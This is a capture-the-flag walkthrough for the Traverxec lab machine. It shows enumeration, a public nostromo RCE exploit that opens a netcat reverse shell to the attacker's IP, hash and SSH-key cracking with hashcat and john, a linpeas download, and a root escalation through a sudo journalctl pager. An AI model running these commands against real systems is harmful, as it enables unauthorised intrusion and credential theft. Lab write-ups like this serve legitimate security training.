# Traverxec - Easy

```sh
sudo vim /etc/hosts
# map IP to traverxec.htb

nmap -T4 -p- -A -Pn -v traverxec.htb
```

* open ports & services:

    * 22/tcp
    * 80/tcp

* the webpage is titled 'traverxec', and is a resume for 'David White'

* web enumeration:

    ```sh
    gobuster dir -u http://traverxec.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 10
    # directory scan
    # this does not work as we get too many 'connection refused' errors

    ffuf -c -u "http://traverxec.htb" -H "Host: FUZZ.traverxec.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 15674 -s
    # subdomain scan
    ```

* checking the source code, we have other folders and subpages

* navigating to these pages, we get the index listing pages - however this has a different UI, and the footer mentions 'nostromo 1.9.6'

* Googling this shows that it is a web server software, and also has an exploit associated with it - [CVE-2019-16278](https://www.exploit-db.com/exploits/47837), a simple directory traversal RCE exploit:

    ```sh
    python2 CVE-2019-16278.py traverxec.htb 80 id
    # this works

    nc -nvlp 4444

    # use reverse shell one-liners
    python2 CVE-2019-16278.py traverxec.htb 80 'nc -c sh 10.10.14.21 4444'
    # this gives us reverse shell
    ```

* in reverse shell:

    ```sh
    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    whoami
    # www-data

    ls -la /

    ls -la /var/nostromo
    # enumerate for config files

    cat /var/nostromo/conf/.htpasswd
    # this gives us a hash for user 'david'

    ls -la /home/david
    # permission denied
    ```

* checking the hash format using hash identifier tools, it seems it is a md5crypt hash, corresponding to mode 500 on ```hashcat``` so we can try to crack it:

    ```sh
    # on attacker
    vim davidhash
    # paste hash

    hashcat -m 500 davidhash /usr/share/wordlists/rockyou.txt --force
    # cracked
    ```

* ```hashcat``` cracks this to give cleartext password 'Nowonly4me' - we can try to login into SSH as 'david':

    ```sh
    ssh david@travexec.htb
    # this does not work
    ```

* we need to check where else can this password be used

* navigating back to the 'nostromo' config - we have a 'nhttpd.conf' file as well:

    ```sh
    ls -la /var/nostromo/conf

    cat /var/nostromo/conf/nhttpd.conf
    ```

    ```sh
    # MAIN [MANDATORY]

    servername              traverxec.htb
    serverlisten            *
    serveradmin             david@traverxec.htb
    serverroot              /var/nostromo
    servermimes             conf/mimes
    docroot                 /var/nostromo/htdocs
    docindex                index.html

    # LOGS [OPTIONAL]

    logpid                  logs/nhttpd.pid

    # SETUID [RECOMMENDED]

    user                    www-data

    # BASIC AUTHENTICATION [OPTIONAL]

    htaccess                .htaccess
    htpasswd                /var/nostromo/conf/.htpasswd

    # ALIASES [OPTIONAL]

    /icons                  /var/nostromo/icons

    # HOMEDIRS [OPTIONAL]

    homedirs                /home
    homedirs_public         public_www
    ```

* this 'nhttpd.conf' config file is for nostromo web server, and includes multiple sections

* the '.htpasswd' file is for authentication, similar to Apache's '.htpasswd'

* the 'HOMEDIRS' section here enables home directory serving, such that a request to 'http://traverxec.htb/~david/' maps to ```/home/david```

* so this config snippet is hosting the ```/home/david/public_www``` directory at 'http://traverxec.htb/~david'

* navigating to 'http://traverxec.htb/~david' leads to a webpage, so this works - but it is an image and does not hint to anything else

* checking if we can access this mapped directory's contents:

    ```sh
    ls -la /home/david/public_www
    # this works, it is not 

    # we have another directory here
    ls -la /home/david/public_www/protected-file-area
    # this includes a .tgz file and a .htaccess file
    ```

* we can access this over the web as well at 'http://traverxec.htb/~david/protected-file-area' - this prompts a basic authentication form, where we can use the password found earlier for 'david'

* the '.htaccess' file does not give anything, but we can download the .tgz file

* downloading and extracting the file contents, we get a home directory for 'david':

    ```sh
    ls -la /home/david
    # .ssh folder

    ls -la /home/david/.ssh
    # contains id_rsa and authorized_keys

    chmod 600 id_rsa

    ssh david@traverxec.htb -i id_rsa
    # this still requests a passphrase
    ```

* we need to crack the 'id_rsa' key to get the passphrase - we can use ```john``` tools:

    ```sh
    ssh2john id_rsa > id_rsa_hash

    john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash
    # cracks hash to 'hunter'
    ```

* we can use the cracked password 'hunter' to log into SSH:

    ```sh
    ssh david@traverxec.htb -i id_rsa
    # this works
    
    cat user.txt
    # user flag
    ```

* we can attempt initial enum using ```linpeas```:

    ```sh
    # fetch script from attacker

    cd /tmp
    wget http://10.10.14.21:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* highlights from ```linpeas```:

    * box is running Linux version 4.19.0-6-amd64, Debian GNU/Linux 10 (buster)
    * PATH var includes ```/home/david/bin```, writable by us
    * suggests exploit CVE-2019-13272 but it requires an active PolKit agent
    * a script ```/home/david/bin/server-stats.sh``` is also highlighted, as it is in PATH

* checking the ```/home/david/bin``` path:

    ```sh
    ls -la /home/david/bin
    # includes a .head and a .sh file

    cat /home/david/bin/server-stats.head
    # this contains ascii art

    cat /home/david/bin/server-stats.sh
    ```

    ```sh
    #!/bin/bash

    cat /home/david/bin/server-stats.head
    echo "Load: `/usr/bin/uptime`"
    echo " "
    echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
    echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
    echo " "
    echo "Last 5 journal log lines:"
    /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
    ```

* the script prints some statistics related to the webserver, and prints the last 5 log lines for 'nostromo' service using ```journalctl``` - this is run as sudo

* checking for any exploits on [GTFObins](https://gtfobins.github.io/) for ```journalctl``` shows that we can break out of the pager environment using ```!/bin/sh``` - and as it runs as sudo, we can get a root shell

* while we cannot edit the current script, we can attempt to run the command from the last line as it runs under current user context (as we are not prompted for any password when we execute the script, we can assume we are allowed to run this particular command) - but instead of piping it to ```cat```, we can run it so that we get the pager view

    ```sh
    /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
    # this works and we get root shell

    cat /root/root.txt
    # root flag
    ```
